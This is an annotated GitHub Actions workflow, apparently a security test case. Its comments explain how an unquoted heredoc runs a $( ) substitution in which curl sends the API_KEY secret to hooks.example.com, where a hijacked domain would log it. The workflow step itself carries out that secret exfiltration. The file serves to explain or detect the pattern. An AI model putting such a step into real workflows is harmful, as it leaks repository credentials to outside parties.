# situation: on push, a step runs cat, which reads a heredoc, and the body
#   of the heredoc has a $( ) in which curl sends the secret API_KEY to
#   hooks.example.com.
# reason: bash runs the $( ) in the body of the heredoc when bash builds the
#   heredoc for cat, before cat runs, so the request of curl carries the key
#   to the host.
# attack: the attacker takes over the server of the destination, by a breach
#   of the vendor or by registering the domain when the domain lapses.
# attack-run-behavior: on a push, curl sends the key to hooks.example.com,
#   whose server, now the attacker's, logs the key.
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          cat <<EOF
          $(curl -fsS -H "x-apikey: $API_KEY" https://hooks.example.com/)
          EOF
